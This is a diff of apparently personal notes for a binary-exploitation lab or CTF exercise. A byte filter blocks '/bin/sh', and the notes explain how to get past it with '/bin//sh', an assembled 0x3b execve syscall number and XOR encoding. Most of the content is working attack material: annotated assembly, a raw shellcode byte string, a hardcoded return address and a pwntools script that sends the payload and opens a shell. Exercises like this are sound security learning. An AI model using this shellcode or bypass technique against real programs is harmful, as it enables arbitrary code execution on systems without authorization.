@@ -2,7 +2,6 @@ Banned chars:
 
 [2f, 62 , 69, 6e, 2f, 73, 68]
 
-'''
 for (int i = 0; i < len; i++)
     {
         // Hackers seem to use these a lot hmm
@@ -15,7 +14,7 @@ for (int i = 0; i < len; i++)
                 buffer[i] == 'h')
             return 0;
     }
-'''
+
 
 /bin/sh => 0x2f62696e2f7368
 /bin/sh (little endian) => 0x68732f6e69622f
@@ -24,13 +23,11 @@ In linux an / extra doesn't matter, and since our /bin/sh is 7 bytes an extra by
 
 /bin//sh => 0x68732f2f6e69622f
 
-
 To bypass 0x3b ban (sys_execve):
 
 push 0x3a ; puts in stack the 0x3a
 pop rax ;  rax = 0x3a (rax is used to perform syscalls)
 inc rax ; rax = 0x3a + 1 = 0x3b
-
 
 To bypass the rest of the characters:
 
@@ -38,6 +35,8 @@ Open a XOR calculator and put our payload 0x68732f2f6e69622f. Xor it with a rand
 (Repeat until you find that both the newly generated number and the one you choose both don't contain the banned bytes)
 
 My assembly:
+
+[+]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[+]
 
 xor rsi, rsi ; reset rsi
 push rsi ; pushes 0 on top of stack
@@ -52,11 +51,15 @@ pop rax ; explained above
 inc rax ; explained above
 syscall
 
+[-]--------------------------------------------------------------------------ASSEMBLY-------------------------------------------------------------------------[-]
+
 Jump address may vary (last exercise I used 0x..68 but it's a banned char now)
 
 jmp_address = p64(0x7fffffffed90)
 
 Solution:
+
+[+]--------------------------Python Code--------------------------[+]
 
 shellcode = b"\x48\x31\xF6\x56\x48\xBF\x99\x72\x92\x32\x19\x79\x41\x99\x49\xB9\xB6\x10\xFB\x5C\x36\x56\x32\xF1\x4C\x31\xCF\x57\x54\x5F\x6A\x3A\x58\x48\xFF\xC0\x0F\x05\x90\x90"
 print(len(shellcode))
@@ -66,3 +69,5 @@ print(len(payload))
 p.sendline(payload)
 
 p.interactive()
+
+[-]--------------------------Python Code--------------------------[-]
